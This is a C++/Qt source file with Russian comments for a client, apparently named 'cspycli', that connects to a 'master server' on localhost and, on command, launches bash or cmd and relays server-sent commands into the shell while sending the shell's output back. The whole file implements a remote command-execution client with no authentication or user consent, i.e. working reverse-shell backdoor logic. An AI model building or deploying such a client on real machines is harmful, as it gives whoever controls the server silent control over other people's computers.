﻿#include "Client.h"
#include <iostream>
#include <QCryptographicHash>
#include <QTime>
#include <QRegExp>
Client::Client(QObject *parent) :
    QObject(parent),
    port(1235),
    server(QHostAddress::LocalHost)
{
    // Добавялем первый протокол
    availableProtocols.push_back(1);

    qDebug() << server << port;
    socket = new QTcpSocket(this);

    // Соединение с мастер-сервером
    socket->connectToHost(server, port);

    // Подключение всех необходимых сигналов
    // Исправить : не подключать если нет коннекта
    connect(socket, SIGNAL(connected()), this, SLOT(onConnect()));
    connect(socket, SIGNAL(disconnected()), this, SLOT(onDisconnect()));
    connect(socket, SIGNAL(readyRead()), this, SLOT(sortIncomingData()));

    // Ожидание 3 секунды,
    // на случай медленного инета
    if(socket->waitForConnected(3000))
        qDebug() << "Connected to " << server.toString() << port;
    else
        qDebug() << "Unable to connect";

}

void Client::onConnect()
{
    QString time = QString("%1").arg( QTime::currentTime().msec() );
    QString md5hash = QString(QCryptographicHash::hash((qPrintable(time)), QCryptographicHash::Md5).toHex());
    socket->write(qPrintable(QString("cspycli:1:%1:").arg(md5hash)));
}

void Client::onDisconnect()
{
    qDebug() << "The connection to the server has been lost";
}

void Client::sortIncomingData()
{
    QRegExp rx("f:(\\d+):(\\d+):(.*)");
    QString incoming = QString::fromLocal8Bit(socket->readAll());
    qDebug() << incoming;

    // Проверяем запрос
    if(rx.indexIn(incoming) != -1){

        // Берём в data дату из запроса
        QString data = rx.cap(3);

        //берем хидер даты и отдаем дату нужному парсеру
        QRegExp re = QRegExp("(\\w+):");

        if(re.indexIn(data) != -1){
            quint32 dataHeader = re.cap(1).at(0).toAscii();

            switch(dataHeader){
            case '1':
                parseFirstProtocol(rx.cap(1).toInt(), data);
                break;
            case 'l':
                sendAvailableProtocols(rx.cap(1).toInt());
                break;
            case 'a':
            case 'd':
                activateDeactivateProtocol(rx.cap(1).toInt(), data);
                break;
            }
        }
        return;
    }
}

void Client::parseFirstProtocol(qint32 adminId, QString incoming)
{
    // Не шарю в решулярках, наверно что-то не так,
    // но худо-бедно работает
    QRegExp rx = QRegExp("1:(\\w+):(.*)");
    rx.indexIn(incoming);
    qDebug() << rx.indexIn(incoming);

    // Если команда протоколу правильная
    // и протокол запущен
    // отправить запрос в первый протокол
    // в данном случае в консоль винды
    if((rx.captureCount() != -1) && firstprotocol->Running)
        firstprotocol->write(qPrintable(QString("%1\n").arg(rx.cap(2).left(rx.cap(1).toInt()))));
}

void Client::sendAvailableProtocols(qint32 adminId)
{
    // Крайне криво на мой вгляд.
    // Нужно упростить.
    QString protocols = "m:";
    for(short i = 0; i < availableProtocols.size(); ++i){
        protocols.append(QString::number(availableProtocols.at(i)));
        if(i < availableProtocols.size()-1)
            protocols.append(";");
    }
    protocols.append(":");
    qDebug() << protocols;
    sendData(adminId, qPrintable(protocols));
}

void Client::activateDeactivateProtocol(qint32 adminId, QString incoming)
{
    // Я не до конца разбираюсь в регулярках
    // поэтому тут все совсем глупо
    QRegExp rx = QRegExp("(\\w):(\\d+):");
    rx.indexIn(incoming);
    qDebug() << "active";
    QString mode = rx.cap(1);
    QString proto = rx.cap(2);
    this->adminId = adminId;
    if(mode=="a"){
        if(proto == "1"){
            firstprotocol = new QProcess(this);
#ifdef Q_WS_X11
            firstprotocol->start("bash");
#endif

#ifdef Q_WS_MAC
            firstprotocol->start("bin/bash");
#endif

#ifdef Q_WS_QWS
            firstprotocol->start("bash");
#endif

#ifdef Q_WS_WIN
            firstprotocol->start("cmd");
#endif
            connect(firstprotocol,
                    SIGNAL(readyReadStandardOutput()),
                    this,
                    SLOT(slotDataOnStdout())
                    );
        }
    }
    else {
        firstprotocol->disconnect(this);
        firstprotocol->close();
    }

}

void Client::sendData(qint32 adminId, const QByteArray& data)
{
    QByteArray gogo = (QString("t:%1:%2:").arg(adminId).arg(data.size()))
            .toUtf8() + data;
    socket->write(gogo);
}

void Client::slotDataOnStdout(){
    QString output = QString::fromLocal8Bit(firstprotocol->readAllStandardOutput());
    QByteArray data=(QString("1:%1:%2:").arg(output.size()).arg(output)).toUtf8();
    sendData(this->adminId, data);
}
